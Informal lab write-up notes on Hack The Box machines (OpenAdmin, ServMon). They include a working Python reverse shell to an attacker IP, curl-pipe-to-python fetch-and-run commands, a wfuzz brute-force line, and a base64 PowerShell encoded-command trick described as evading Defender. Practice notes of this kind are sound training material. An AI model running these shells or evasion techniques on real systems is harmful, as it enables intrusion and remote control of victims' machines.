Openadmin

Enum
-------------

Checking  the sites,we found all the pages are HTML, no php pages. 
Clicking on login button takes to ona web page (openadmin)

Got the reverse shell .

Now we want full reverse shell. we tried python,bash,perl , but nothing works.

But then we copied the python revesrse shell in rev.py and the call the reverse shell via curl and push the rev.py into python. like this:

root@kali:~/htb/boxes/openadmin# cat rev.py 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
root@kali:~/htb/boxes/openadmin# 

$ curl http://10.10.14.25/rev.py | python3


We tried like 


curl http://10.10.14.25/rev.py | bash
curl http://10.10.14.25/rev.py | python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

but it didnt works.


From there, we got the root shell.

Lots of enumeration ( bascially directory enumeration)
Found FTP password
Found db sql file and compresses HTTP
From HTTP ,found script under utility- directory and more crendentiald directory.
From there, did directory enumeration under utiltiy directory again and found adminer.php file.

As per search, we need to create the database and connect to ourr database from adminer.php database manager.


For priv esc, we have, python path reset. 

Findings
-----------

I learnt here to use wfuzz(wfuzz -c -u http://admirer.htb/admin-dir/FUZZ.FUZ2Z  -w /usr/share/dirb/wordlists/big.txt -w ext --hc 403,404 
) for directory enumeration  and to use wordlist "/usr/share/dirb/wordlists/big.txt" for directory enumeration.

Servmon
---------

Enum
-----

FTP access gives the path for password file.
NVSM-1000 exploit via directry traversal, wwe got the creds.
Trying those creds for ssh access for one of the use and we got in
From there , found NSSCLIENT and its password.
Port forward via ~C to Kali machine.
Tried to transfer the binaries to victim machine, but failed because of defendeer, but the same works via curl.
Tred running encoded powershell command to understand how to works and also to bypass the defender and any blacklisted command.


Findings
---------

when downloading the file via smbserver, defender blocked it. When downloading the same file via curl, it was allowed.
Also came to use the powershell encoded command,like 

echo 'ping 10.10.10.13' | iconv -t utf-16le | base64 -w 0
echo powershell -enc cABpAG4AZwAgADEAMAAuADEAMAAuADEANAAuADIANQAKAA== > ping.bat

When you run >ping.bat, it will ping the system.


For reverse shell, one line powershell rever tcp wll help to encode and then you can run like above.
